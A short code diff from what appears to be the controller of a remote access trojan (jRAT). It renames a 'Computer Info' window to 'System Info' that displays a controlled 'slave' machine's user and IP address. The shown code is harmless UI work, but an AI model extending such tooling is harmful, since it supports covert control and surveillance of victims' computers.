@@ -10,11 +10,11 @@ import se.jrat.client.Slave;
 import se.jrat.client.ui.panels.PanelControlSystemInfo;
 
 @SuppressWarnings("serial")
-public class FrameComputerInfo extends JFrame {
+public class FrameSystemInfo extends JFrame {
 
 	private JPanel contentPane;
 
-	public FrameComputerInfo(Slave slave) {
+	public FrameSystemInfo(Slave slave) {
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 450, 300);
 		contentPane = new JPanel();
@@ -22,7 +22,7 @@ public class FrameComputerInfo extends JFrame {
 		contentPane.setLayout(new BorderLayout(0, 0));
 		setContentPane(contentPane);
 		contentPane.add(new PanelControlSystemInfo(slave));
-		setTitle("Computer Info - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
+		setTitle("System Info - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
 	}
 
 }
